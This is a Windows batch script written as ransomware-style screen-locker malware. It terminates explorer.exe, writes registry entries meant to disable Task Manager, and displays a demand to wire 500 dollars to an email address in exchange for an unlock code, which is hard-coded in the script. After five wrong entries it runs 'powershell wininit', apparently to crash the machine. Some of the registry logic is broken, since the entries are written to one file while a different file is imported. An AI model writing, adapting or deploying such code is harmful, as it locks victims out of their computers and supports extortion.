@echo off
rem | Set The Variables for the code. |
title YOU CAN'T DO ANYTHING TO STOP ME
set wrong="0"
set passwd=MW9X2U
color 0A
taskkill /f /im explorer.exe
goto taskmgr-disable
:ransomware
echo ----------------------------------------
echo Your Computer is Locked Out!
echo ----------------------------------------
echo Wire Us 500 Dolars and email The Code
echo at code@qwer.com
echo The Code Is: %passwd%
echo The Code You See Is Not the Real One.
echo ----------------------------------------
echo Closing the program or restarting the
echo Computer Can can destroy and lose your 
echo data.
echo ----------------------------------------
Set /p userpasswd=REAL-CODE:
if %userpasswd% == %passwd% goto terminal
cls
echo ----------------------------------------
echo The Code is Incorrect!
set /a "wrong=%wrong%+1"
if %wrong%==5 powershell wininit
goto ransomware

:terminal
title Code Found Succsesfully!
cls
echo Do you want to use the command prompt, get the Desktop or Enable Task Manager? (1=Command Prompt, 2=Back To Desktop, 3=Enable taskmgr
set /p option=Choose an Option: 
if %option% == 1 start cmd.exe
if %option% == 2 start explorer.exe
if %option% == 3 goto enable-taskmgr
exit

:taskmgr-disable
ECHO REGEDIT4 > %WINDIR%\disable.REG
echo. >> %WINDIR%\DXM.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System] >> %WINDIR%\DXM.reg
echo "DisableTaskMgr"=dword:1>> %WINDIR%\DXM.reg
echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System] >> %WINDIR%\DXM.reg
echo "DisableTaskMgr"=dword:1 >> %WINDIR%\DXM.reg
start /w regedit /s %WINDIR%\disable.reg
cls
goto ransomware

:enable-taskmgr
ECHO REGEDIT4 > %WINDIR%\enable.REG
echo. >> %WINDIR%\DXM.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System] >> %WINDIR%\DXM.reg
echo "DisableTaskMgr"=dword:0>> %WINDIR%\DXM.reg
echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System] >> %WINDIR%\DXM.reg
echo "DisableTaskMgr"=dword:0>> %WINDIR%\DXM.reg
start /w regedit /s %WINDIR%\enable.reg

